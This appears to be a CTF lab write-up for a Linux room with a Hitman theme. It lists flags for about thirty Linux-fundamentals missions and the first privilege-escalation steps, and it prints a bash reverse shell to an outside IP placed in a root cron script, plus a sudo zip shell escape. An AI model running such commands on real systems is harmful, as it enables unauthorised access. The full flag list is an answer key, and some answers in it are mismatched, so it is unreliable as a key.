<p>June 25, 2025</p>
<h1>Linux Agency</h1>
<p>This Room will help you to sharpen your Linux Skills and help you to learn basic privilege escalation in a HITMAN theme. So, pack your briefcase and grab your SilverBallers as its gonna be a tough ride.</p>

<br>

<h1>Task 1 . Deploy the Machine</h1>

<p>1.1. Deploy This Machine.<br>
<code>No answer needed</code></p>

<br>

<h1>Task 2 . Let´s jump in</h1>
<p>Please wait about 1 minute before SSH'ing into the box.<br>

SSH Username : agent47<br>

SSH Password : 640509040147<br>

Each flag found will serve as the password for the next user. The flag includes the username of the next user that is part of this challenge. The Flag format is : username{md5sum}<br>

The order of users: agent47 --> mission1 --> mission30 will be part of Task 3: Linux Fundamentals.<br>

After those missions, the next levels will be in Task 4: Privilege Escalation.</p>

<br>

<p>2.1. SSH into the box as agent47<br>
<code>No answer needed</code></p>

```bash
:~/LinuxAgency# ssh agent47@TargetIP
...
mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
agent47@linuxagency:~$
```

![image](https://github.com/user-attachments/assets/705f61fb-3778-4271-83bd-c5dca0638918)

<br>

<h1>Task 3 . Linux Fundamentals</h1>
<p>Agent 47, we are ICA, the Linux Agency. We will test your Linux Fundamentals. Let's see if you can pass all these challenges of basic Linux. The password of the next mission will be the flag of that mission. Example: mission1{1234567890} will be the password for the mission1 user.</p>
<h3>Mission Active</h3>

<p>3.1. What is the mission1 flag?<br>
<code>mission1{174dc8f191bcbb161fe25f8a5b58d1f0}</code></p>

<p>3.2. What is the mission2 flag?<br>
<code>mission1{174dc8f191bcbb161fe25f8a5b58d1f0}</code></p>

<p>used <code>mission2{8a1b68bb11e4a35245061656b5b9fa0d}</code> as password.</p>

```bash
:~/LinuxAgency# ssh agent47@TargetIP
...
mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
agent47@linuxagency:~$ su mission1
Password: 
mission1@linuxagency:/home/agent47/Documents$ cd /home
mission1@linuxagency:/home$ ls
0z09e    jordan    mission10  mission14  mission18  mission21  mission25  mission29  mission5  mission9  silvio
agent47  ken       mission11  mission15  mission19  mission22  mission26  mission3   mission6  penelope  viktor
dalia    maya      mission12  mission16  mission2   mission23  mission27  mission30  mission7  reza      xyan1d3
diana    mission1  mission13  mission17  mission20  mission24  mission28  mission4   mission8  sean
mission1@linuxagency:/home$ cd mission1
mission1@linuxagency:~$ ls
mission2{8a1b68bb11e4a35245061656b5b9fa0d}
```

<p>3.3. What is the mission3 flag?<br>
<code>mission3{ab1e1ae5cba688340825103f70b0f976}</code></p>

```bash
mission1@linuxagency:~$ su mission2
Password: 
mission2@linuxagency:/home/mission1$ cd ..
mission2@linuxagency:/home$ cd mission2
mission2@linuxagency:~$ ls
flag.txt
mission2@linuxagency:~$ cat flag.txt
mission3{ab1e1ae5cba688340825103f70b0f976}
```

<p>3.4. What is the mission4 flag?<br>
<code>mission4{264a7eeb920f80b3ee9665fafb7ff92d}</code></p>

```bash
mission2@linuxagency:~$ su mission3
Password:
...
mission3@linuxagency:~$ cat flag.txt
I am really sorry man the flag is stolen by some thief's.
mission3@linuxagency:~$ 
mission3@linuxagency:~$ file flag.txt
flag.txt: ASCII text, with CR, LF line terminators
mission3@linuxagency:~$ strings flag.txt
mission4{264a7eeb920f80b3ee9665fafb7ff92d}
I am really sorry man the flag is stolen by some thief's.
```

<p>3.5. What is the mission5 flag?<br>
<code>mission5{bc67906710c3a376bcc7bd25978f62c0}</code></p>

```bash
mission3@linuxagency:~$ su mission4
Password: 
...
mission4@linuxagency:~$ ls -lah
total 20K
drwxr-x---  3 mission4 mission4 4.0K Jan 12  2021 .
drwxr-xr-x 45 root     root     4.0K Jan 12  2021 ..
lrwxrwxrwx  1 mission4 mission4    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission4 mission4 3.7K Jan 12  2021 .bashrc
drwxr-xr-x  2 mission4 mission4 4.0K Jan 12  2021 flag
-rw-r--r--  1 mission4 mission4  807 Jan 12  2021 .profile
mission4@linuxagency:~$ cd flag
...
mission4@linuxagency:~/flag$ cat flag.txt
mission5{bc67906710c3a376bcc7bd25978f62c0}
mission4@linuxagency:~/flag$ 
```

<p>3.6. What is the mission6 flag?<br>
<code>mission6{1fa67e1adc244b5c6ea711f0c9675fde}</code></p>

```bash
mission4@linuxagency:/home$ su mission5
Password: 
...
mission5@linuxagency:~$ cat .flag.txt
mission6{1fa67e1adc244b5c6ea711f0c9675fde}
```

<p>3.7. What is the mission7 flag?<br>
<code>mission7{53fd6b2bad6e85519c7403267225def5}</code></p>

```bash
mission5@linuxagency:/home$ su mission6
Password: 
mission6@linuxagency:/home$ cd mission6
mission6@linuxagency:~$ find / -type f -name "flag.txt" 2>/dev/null
/home/mission6/.flag/flag.txt
/flag.txt
mission6@linuxagency:~$ cat ~/.flag/flag.txt
mission7{53fd6b2bad6e85519c7403267225def5}
```

<p>3.8. What is the mission8 flag?<br>
<code>mission8{3bee25ebda7fe7dc0a9d2f481d10577b}</code></p>

```bash
mission6@linuxagency:~$ su mission7
Password:
mission7@linuxagency:/home/mission7$ ls
flag.txt
mission7@linuxagency:/home/mission7$ cat flag.txt
mission8{3bee25ebda7fe7dc0a9d2f481d10577b}
```

<p>3.9. What is the mission9 flag?<br>
<code>mission9{ba1069363d182e1c114bef7521c898f5}</code></p>

```bash
mission7@linuxagency:/home/mission7$ su mission8
Password: 
...
mission8@linuxagency:~$ find / -type f -name "flag.txt" 2>/dev/null
/flag.txt
...
mission8@linuxagency:/$ cat flag.txt
mission9{ba1069363d182e1c114bef7521c898f5}
```

<p>3.10. What is the mission10 flag?<br>
<code>mission10{0c9d1c7c5683a1a29b05bb67856524b6}</code></p>

```bash
mission8@linuxagency:/home/mission8$ su mission9
Password: 
...
mission9@linuxagency:~$ grep -r "mission10" /home 2>/dev/null
/home/mission9/rockyou.txt:mission101
/home/mission9/rockyou.txt:mission10
/home/mission9/rockyou.txt:mission10{0c9d1c7c5683a1a29b05bb67856524b6}
/home/mission9/rockyou.txt:mission1098
/home/mission9/rockyou.txt:mission108
```

<p>3.11. What is the mission11 flag?<br>
<code>mission11{db074d9b68f06246944b991d433180c0}</code></p>

```bash
mission9@linuxagency:/home/mission9$ su mission10
Password: 
...
mission10@linuxagency:~$ find / -type f -name "flag.txt" 2>/dev/null
/home/mission10/folder/L4D8/L3D7/L2D2/L1D10/flag.txt
/flag.txt
mission10@linuxagency:~$ cat /home/mission10/folder/L4D8/L3D7/L2D2/L1D10/flag.txt
mission11{db074d9b68f06246944b991d433180c0}
```

<p>3.12. What is the mission12 flag?<br>
<code>mission12{f449a1d33d6edc327354635967f9a720}</code></p>

```bash
mission9@linuxagency:/home/mission9$ su mission10
Password: 
...
mission11@linuxagency:~$ env | grep mission12
FLAG=mission12{f449a1d33d6edc327354635967f9a720}
flag=mission12{f449a1d33d6edc327354635967f9a720}
```

<p>3.13. What is the mission13 flag?<br>
<code>mission13{076124e360406b4c98ecefddd13ddb1f}</code></p>

```bash
mission12@linuxagency:/$ ls /home/mission12/flag.txt
/home/mission12/flag.txt
mission12@linuxagency:/$ ls -l /home/mission12/flag.txt
---------- 1 mission12 mission12 44 Jan 12  2021 /home/mission12/flag.txt
mission12@linuxagency:/$ chmod 777 /home/mission12/flag.txt
mission12@linuxagency:/$ ls -l /home/mission12/flag.txt
-rwxrwxrwx 1 mission12 mission12 44 Jan 12  2021 /home/mission12/flag.txt
mission12@linuxagency:/$ cat /home/mission12/flag.txt
mission13{076124e360406b4c98ecefddd13ddb1f}
```

<p>3.14. What is the mission14 flag?<br>
<code>mission14{d598de95639514b9941507617b9e54d2}</code></p>

```bash
mission13@linuxagency:/$ cat /home/mission13/flag.txt
bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=
mission13@linuxagency:/$ echo 'bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=' | base64 -d
mission14{d598de95639514b9941507617b9e54d2}
```

<p>3.15. What is the mission15 flag?<br>
<code>mission15{fc4915d818bfaeff01185c3547f25596}</code></p>

```bash
mission14@linuxagency:/$ cat /home/mission14/flag.txt
01101101011010010111001101110011011010010110111101101110001100010011010101111011011001100110001100110100001110010011000100110101011001000011100000110001001110000110001001100110011000010110010101100110011001100011000000110001001100010011100000110101011000110011001100110101001101000011011101100110001100100011010100110101001110010011011001111101
```

<p>used <code>RapidTables</code></p>

![image](https://github.com/user-attachments/assets/d794e4b9-b586-45a9-b370-1e21429d60cc)


<p>3.16. What is the mission16 flag?<br>
<code>mission16{884417d40033c4c2091b44d7c26a908e}</code></p>

```bash
mission15@linuxagency:/$ cat /home/mission15/flag.txt
6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D
mission15@linuxagency:/$ echo '6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D' | xxd -r -p
mission16{884417d40033c4c2091b44d7c26a908e}
```

<p>3.17. What is the mission17 flag?<br>
<code>mission17{49f8d1348a1053e221dfe7ff99f5cbf4}</code></p>

```bash
mission16@linuxagency:~$ file flag
flag: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1606102f7b80d832eabee1087180ea7ce24a96ca, not stripped
mission16@linuxagency:~$ chmod 777 flag
mission16@linuxagency:~$ ./flag
mission17{49f8d1348a1053e221dfe7ff99f5cbf4}
```

<p>3.18. What is the mission18 flag?<br>
<code>mission18{f09760649986b489cda320ab5f7917e8}</code></p>

```bash
mission17@linuxagency:~$ ls -lah
total 20K
drwxr-x---  2 mission17 mission17 4.0K Jan 12  2021 .
drwxr-xr-x 45 root      root      4.0K Jan 12  2021 ..
lrwxrwxrwx  1 mission17 mission17    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission17 mission17 3.7K Jan 12  2021 .bashrc
-rwxr-xr-x  1 mission17 mission17  475 Jan 12  2021 flag.java
-rw-r--r--  1 mission17 mission17  807 Jan 12  2021 .profile
mission17@linuxagency:~$ file flag.java
flag.java: C source, ASCII text, with CRLF line terminators
mission17@linuxagency:~$ javac flag.java
mission17@linuxagency:~$ ls
flag.class  flag.java
mission17@linuxagency:~$ java flag
mission18{f09760649986b489cda320ab5f7917e8}
```

<p>3.19. What is the mission19 flag?<br>
<code>mission19{a0bf41f56b3ac622d808f7a4385254b7}</code></p>

```bash
mission18@linuxagency:~$ ls
flag.rb
mission18@linuxagency:~$ file flag.rb
flag.rb: Ruby script, ASCII text
mission18@linuxagency:~$ ruby flag.rb
mission19{a0bf41f56b3ac622d808f7a4385254b7}
```

<p>3.20. What is the mission20 flag?<br>
<code>mission20{b0482f9e90c8ad2421bf4353cd8eae1c}</code></p>

```bash
mission19@linuxagency:~$ ls
flag.c
mission19@linuxagency:~$ file flag.c
flag.c: C source, ASCII text
mission19@linuxagency:~$ gcc flag.c -o flag
flag.c: In function \u2018main\u2019:
flag.c:5:18: warning: implicit declaration of function \u2018strlen\u2019 [-Wimplicit-function-declaration]
     int length = strlen(flag);
                  ^~~~~~
flag.c:5:18: warning: incompatible implicit declaration of built-in function \u2018strlen\u2019
flag.c:5:18: note: include \u2018<string.h>\u2019 or provide a declaration of \u2018strlen\u2019
mission19@linuxagency:~$ ls
flag  flag.c
mission19@linuxagency:~$ ./flag
mission20{b0482f9e90c8ad2421bf4353cd8eae1c}
```

<p>3.21. What is the mission21 flag?<br>
<code>mission21{7de756aabc528b446f6eb38419318f0c}</code></p>

```bash
mission20@linuxagency:~$ ls -lah
total 20K
drwxr-x---  2 mission20 mission20 4.0K Jan 12  2021 .
drwxr-xr-x 45 root      root      4.0K Jan 12  2021 ..
lrwxrwxrwx  1 mission20 mission20    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission20 mission20 3.7K Jan 12  2021 .bashrc
-r--------  1 mission20 mission20  186 Jan 12  2021 flag.py
-rw-r--r--  1 mission20 mission20  807 Jan 12  2021 .profile
mission20@linuxagency:~$ which python3
/usr/bin/python3
mission20@linuxagency:~$ python3 flag.py
mission21{7de756aabc528b446f6eb38419318f0c}
```

<p>3.22. What is the mission22 flag?<br>
<code>mission22{24caa74eb0889ed6a2e6984b42d49aaf}</code></p>

```bash
mission20@linuxagency:~$ su mission21
Password: 
$ bash
mission22{24caa74eb0889ed6a2e6984b42d49aaf}
```

<p>3.23. What is the mission23 flag?<br>
<code>mission23{3710b9cb185282e3f61d2fd8b1b4ffea}</code></p>

```bash
mission21@linuxagency:~$ su mission22
Password: 
Python 3.6.9 (default, Oct  8 2020, 12:12:24) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> exec(open("/home/mission22/flag.txt").read())
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1
    mission23{3710b9cb185282e3f61d2fd8b1b4ffea}
             ^
SyntaxError: invalid syntax
>>> 
```

<p>3.24. What is the mission24 flag?<br>
<code>mission24{dbaeb06591a7fd6230407df3a947b89c}</code></p>

```bash
mission21@linuxagency:~$ su mission23
Password:
...
mission23@linuxagency:~$ ls -lah
total 24K
drwxr-x---  3 mission23 mission23 4.0K Jan 15  2021 .
drwxr-xr-x 45 root      root      4.0K Jan 12  2021 ..
lrwxrwxrwx  1 mission23 mission23    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission23 mission23 3.7K Jan 12  2021 .bashrc
drwxrwxr-x  3 mission23 mission23 4.0K Jan 12  2021 .local
-r--------  1 mission23 mission23   69 Jan 15  2021 message.txt
-rw-r--r--  1 mission23 mission23  807 Jan 12  2021 .profile
mission23@linuxagency:~$ cat message.txt
The hosts will help you.
[OPTIONAL] Maybe you will need curly hairs.
mission23@linuxagency:~$ grep -r 'mission24' /var 2>/dev/null
Binary file /var/log/journal/e5c33f65843d4fde84404ee7ae1a0806/user-1023.journal matches
/var/www/html/index.html:    <title>mission24{dbaeb06591a7fd6230407df3a947b89c}</title>
```

<p>3.25. What is the mission25 flag?<br>
<code>mission25{61b93637881c87c71f220033b22a921b}</code></p>

```bash
mission23@linuxagency:~$ su mission24
Password:
mission24@linuxagency:~$ ls -lah
total 40K
drwxr-x---  3 mission24 mission24 4.0K Feb  1  2021 .
drwxr-xr-x 45 root      root      4.0K Jan 12  2021 ..
lrwxrwxrwx  1 mission24 mission24    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission24 mission24 3.7K Jan 12  2021 .bashrc
-rwxr-xr-x  1 mission24 mission24 8.4K Jan 12  2021 bribe
drwxr-xr-x  3 mission24 mission24 4.0K Jan 12  2021 .local
-rw-r--r--  1 mission24 mission24  807 Jan 12  2021 .profile
-rw-------  1 mission24 mission24 4.9K Jan 12  2021 .viminfo
mission24@linuxagency:~$ file bribe
bribe: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=006516d8c62bb8a5f5a41595ce4529d4bcb159b8, not stripped
mission24@linuxagency:~$ ./bribe


There is a guy who is smuggling flags
Bribe this guy to get the flag
Put some money in his pocket to get the flag

Words are not the price for your flag
Give Me money Man!!!

mission24@linuxagency:~$ grep -r 'mission25' /var 2>/dev/null
Binary file /var/log/journal/e5c33f65843d4fde84404ee7ae1a0806/user-1024.journal matches
mission24@linuxagency:~$ export pocket=money
mission24@linuxagency:~$ ./bribe
Here ya go!!!
mission25{61b93637881c87c71f220033b22a921b}
Don't tell police about the deal man ;)
```

<p>3.26. What is the mission26 flag?<br>
<code>mission26{cb6ce977c16c57f509e9f8462a120f00}</code></p>

```bash
mission24@linuxagency:~$ su mission25
Password:
...
mission25@linuxagency:~$ find / -type f -name "flag.txt" 2>/dev/null
mission25@linuxagency:~$ echo '<flag.txt'
<flag.txt
mission25@linuxagency:~$ echo $PATH

mission25@linuxagency:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin/:/usr/bin:/sbin:/bin
mission25@linuxagency:~$ ls
flag.txt
mission25@linuxagency:~$ cat flag.txt
mission26{cb6ce977c16c57f509e9f8462a120f00}
```

<p>3.27. What is the mission27 flag?<br>
<code>mission27{444d29b932124a48e7dddc0595788f4d}</code></p>

```bash
mission25@linuxagency:~$ su mission26
Password: 
...mission26@linuxagency:~$ ls -lah
total 100K
drwxr-x---  2 mission26 mission26 4.0K Jan 12  2021 .
drwxr-xr-x 45 root      root      4.0K Jan 12  2021 ..
lrwxrwxrwx  1 mission26 mission26    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission26 mission26 3.7K Jan 12  2021 .bashrc
-r--------  1 mission26 mission26  84K Jan 12  2021 flag.jpg
-rw-r--r--  1 mission26 mission26  807 Jan 12  2021 .profile
mission26@linuxagency:~$ file flag.jpg
flag.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 100x100, segment length 16, comment: "mission27{444d29b932124a48e7dddc0595788f4d}", progressive, precision 8, 1000x1870, frames 3
```

<p>3.28. What is the mission28 flag?<br>
<code>mission28{03556f8ca983ef4dc26d2055aef9770f}</code></p>

```bash
mission26@linuxagency:~$ su mission27
Password: 
...
mission27@linuxagency:~$ ls -lah
total 20K
drwxr-x---  2 mission27 mission27 4.0K Jan 12  2021 .
drwxr-xr-x 45 root      root      4.0K Jan 12  2021 ..
lrwxrwxrwx  1 mission27 mission27    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission27 mission27 3.7K Jan 12  2021 .bashrc
-rw-r--r--  1 mission27 mission27  136 Jan 12  2021 flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
-rw-r--r--  1 mission27 mission27  807 Jan 12  2021 .profile
mission27@linuxagency:~$ file flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz: gzip compressed data, was "flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png", last modified: Mon Jan 11 06:42:10 2021, from Unix
mission27@linuxagency:~$ gunzip -k flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
mission27@linuxagency:~$ ls
flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png  flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
mission27@linuxagency:~$ file flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png: GIF image data, version 87a, 27914 x 29545
mission27@linuxagency:~$ cat *
GIF87a
mission28{03556f8ca983ef4dc26d2055aef9770f}
B\ufffd\ufffd_flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.pngs\ufffdt\ufffd0O\ufffd\ufffd\ufffd,.\ufffd\ufffd\ufffd3\ufffd\ufffd60655K\ufffdHN\ufffd\ufffd0NM3II62K1205MLM\ufffd477H\ufffd\ufffd\ufffd\ufffd]33mission27@linuxagency:~$ 
```

<p>3.29. What is the mission29 flag?<br>
<code>mission29{8192b05d8b12632586e25be74da2fff1}</code></p>

```bash
mission27@linuxagency:~$ su mission28
Password: 
irb(main):001:0> exec '/bin/bash'
mission28@linuxagency:/home/mission27$ pwd
/home/mission27
mission28@linuxagency:/home/mission27$ cd ..
mission28@linuxagency:/home$ cd mission28
mission28@linuxagency:~$ ls -lah
total 40K
drwxr-x---  3 mission28 mission28 4.0K Jan 12  2021 .
drwxr-xr-x 45 root      root      4.0K Jan 12  2021 ..
lrwxrwxrwx  1 mission28 mission28    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission28 mission28  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 mission28 mission28 3.7K Jan 12  2021 .bashrc
-rw-r--r--  1 mission28 mission28 8.8K Jan 12  2021 examples.desktop
drwxr-xr-x  3 mission28 mission28 4.0K Jan 12  2021 .local
-rw-r--r--  1 mission28 mission28  807 Jan 12  2021 .profile
-r--------  1 mission28 mission28   44 Jan 12  2021 txt.galf
mission28@linuxagency:~$ file txt.galf
txt.galf: ASCII text
mission28@linuxagency:~$ cat txt.galf
}1fff2ad47eb52e68523621b8d50b2918{92noissim
mission28@linuxagency:~$ irb
irb(main):001:0> '}1fff2ad47eb52e68523621b8d50b2918{92noissim'.reverse
=> "mission29{8192b05d8b12632586e25be74da2fff1}"
irb(main):002:0> exec '/bin/bash'
```

<p>3.30. What is the mission30 flag?<br>
<code>viktor{b52c60124c0f8f85fe647021122b3d9a}</code></p>

```bash
mission28@linuxagency:~$ su mission29
Password: 
...
mission29@linuxagency:~$ ls -lah
total 20K
drwxr-x---  3 mission29 mission29 4.0K Jan 12  2021 .
drwxr-xr-x 45 root      root      4.0K Jan 12  2021 ..
lrwxrwxrwx  1 mission29 mission29    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission29 mission29 3.7K Jan 12  2021 .bashrc
drwxr-xr-x  7 mission29 mission29 4.0K Jan 12  2021 bludit
-rw-r--r--  1 mission29 mission29  807 Jan 12  2021 .profile
mission29@linuxagency:~$ grep -rn 'mission30' /var 2>/dev/null
Binary file /var/log/journal/e5c33f65843d4fde84404ee7ae1a0806/user-1029.journal matches
mission29@linuxagency:~$ grep -rn 'mission30'
bludit/.htpasswd:1:mission30{d25b4c9fac38411d2fcb4796171bda6e} 
```

<p>3.31. What is viktor's Flag?<br>
<code> viktor{b52c60124c0f8f85fe647021122b3d9a}</code></p>

```bash
mission29@linuxagency:/home$ su mission30
Password:
...
mission30@linuxagency:~$ grep -r viktor /home/mission30 2>/dev/null
/home/mission30/Escalator/.git/logs/HEAD:0000000000000000000000000000000000000000 e0b807dbeb5aba190d6307f072abb60b34425d44 root <root@Xyan1d3> 1610359600 +0530	commit (initial): Your flag is viktor{b52c60124c0f8f85fe647021122b3d9a}
/home/mission30/Escalator/.git/logs/refs/heads/master:0000000000000000000000000000000000000000 e0b807dbeb5aba190d6307f072abb60b34425d44 root <root@Xyan1d3> 1610359600 +0530	commit (initial): Your flag is viktor{b52c60124c0f8f85fe647021122b3d9a}
mission30@linuxagency:~$ 
```

<br>

<h2>Task 4 . Privilege Escalation</h2>
<p>Welcome to Privilege Escalation, 47. Glad you made it this far!!! Now, here are some special targets. Your Target is to teach these bad guys a lesson.<br>

Good luck 47!!!!</p>
<h3>Mission Active</h3>

<p>4.1. su into viktor user using viktor's flag as password<br>
<code>No answer needed</code></p>

```bash
mission30@linuxagency:~$ su viktor
Password:
viktor@linuxagency:~$ 
```

<p>4.2. What is dalia's flag?<br>
<code>dalia{4a94a7a7bb4a819a63a33979926c77dc}</code></p>

```bash
viktor@linuxagency:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	dalia	sleep 30;/opt/scripts/47.sh
*  *	* * *	root	echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d > /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;
#
viktor@linuxagency:~$ echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d
#!/bin/bash
#echo "Hello 47"
rm -rf /dev/shm/
#echo "Here time is a great matter of essence"
rm -rf /tmp/
viktor@linuxagency:~$ 
```

<p>edited <code>47.sh</code></p>

```bash
viktor@linuxagency:/opt/scripts$ nano 47.sh
```

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.87.142/4444 0>&1 
```

<p>set up a listener</p>

```bash
:~# nc -nlvp 4444
```

<p>saved <code>47.sh</code></p>

```bash
:~# nc -nlvp 4444
...
dalia@linuxagency:~$ which python3
which python3
/usr/bin/python3
dalia@linuxagency:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
dalia@linuxagency:~$ ^Z
[1]+  Stopped                 nc -nlvp 4444
:~# stty raw -echo; fg
nc -nlvp 4444

dalia@linuxagency:~$ pwd
pwd
/home/dalia
dalia@linuxagency:~$ ls
ls
examples.desktop
flag.txt
dalia@linuxagency:~$ cat flag.txt
cat flag.txt
dalia{4a94a7a7bb4a819a63a33979926c77dc}
```

<p></p>

<p>4.3. What is silvio's flag?<br>
<code>silvio{657b4d058c03ab9988875bc937f9c2ef}</code></p>

```bash
dalia@linuxagency:~$ sudo -l
Matching Defaults entries for dalia on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dalia may run the following commands on linuxagency:
    (silvio) NOPASSWD: /usr/bin/zip
dalia@linuxagency:~$ sudo -l -l
Matching Defaults entries for dalia on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dalia may run the following commands on linuxagency:

Sudoers entry:
    RunAsUsers: silvio
    Options: !authenticate
    Commands:
	/usr/bin/zip
dalia@linuxagency:~$ TF=$(mktemp -u)
dalia@linuxagency:~$ sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 37%)
$ whoami
silvio
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
silvio@linuxagency:/home/dalia$ 
silvio@linuxagency:/home/dalia$ cd ..
silvio@linuxagency:/home$ cd silvio
silvio@linuxagency:~$ ls
examples.desktop  flag.txt
silvio@linuxagency:~$ cat flag.txt
silvio{657b4d058c03ab9988875bc937f9c2ef}
```

<p>GTFObins</p>

![image](https://github.com/user-attachments/assets/68782721-173d-42e4-8de0-d93c2cd6b83c)

![image](https://github.com/user-attachments/assets/d4d657fe-e509-4843-ad21-efb9290fdbb3)




<p>4.4. What is reza's flag?<br>
<code>______</code></p>

```bash

```

<p>4.5. What is jordan's flag?<br>
<code>______</code></p>

```bash

```

<p>4.6. What is ken's flag?<br>
<code>______</code></p>

```bash

```

<p>4.7. What is sean's flag?<br>
<code>______</code></p>

```bash

```

<p>4.8. What is penelope's flag?<br>
<code>______</code></p>

```bash

```

<p>4.9. What is robert's Passphrase?<br>
<code>______</code></p>

```bash

```

<p>4.10. What is user.txt?<br>
<code>______</code></p>

```bash

```

<p>4.11. What is root.txt?<br>
<code>______</code></p>

```bash

```

<br>
<br>

